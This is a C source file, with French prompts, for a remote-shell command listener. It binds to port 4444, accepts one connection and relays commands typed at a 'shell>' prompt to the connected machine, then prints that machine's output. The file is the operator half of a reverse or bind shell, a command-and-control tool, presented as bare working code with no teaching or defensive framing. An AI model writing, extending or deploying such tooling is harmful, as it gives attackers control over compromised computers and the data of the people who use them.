#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(4444);

    if (bind(sock, (struct sockaddr*)&server, sizeof(server)) == -1) {
        perror("bind");
        close(sock);
        return 1;
    }

    if (listen(sock, SOMAXCONN) == -1) {
        perror("listen");
        close(sock);
        return 1;
    }

    printf("[*] En attente de connexion sur le port 4444...\n");

    struct sockaddr_in client_addr;
    socklen_t client_addr_size = sizeof(client_addr);
    int client_sock = accept(sock, (struct sockaddr*)&client_addr, &client_addr_size);
    if (client_sock == -1) {
        perror("accept");
        close(sock);
        return 1;
    }

    printf("[+] Client connecté !\n");

    char cmd[1024] = {0};
    char result[4096] = {0};

    while (1) {
        printf("shell> ");
        fflush(stdout);
        if (fgets(cmd, sizeof(cmd), stdin) == NULL)
            break;

        cmd[strcspn(cmd, "\n")] = 0;

        if (strcmp(cmd, "exit") == 0)
            break;

        if (strlen(cmd) == 0)
            continue;

        if (send(client_sock, cmd, strlen(cmd), 0) == -1) {
            printf("[!] Erreur d'envoi. Le client est peut-être déconnecté.\n");
            break;
        }

        int n = recv(client_sock, result, sizeof(result) - 1, 0);
        if (n > 0) {
            result[n] = '\0';
            printf("%s", result);
        } else if (n == 0) {
            printf("[!] Le client a fermé la connexion.\n");
            break;
        } else {
            printf("[!] Erreur de réception.\n");
            break;
        }
    }

    close(client_sock);
    close(sock);
    return 0;
}
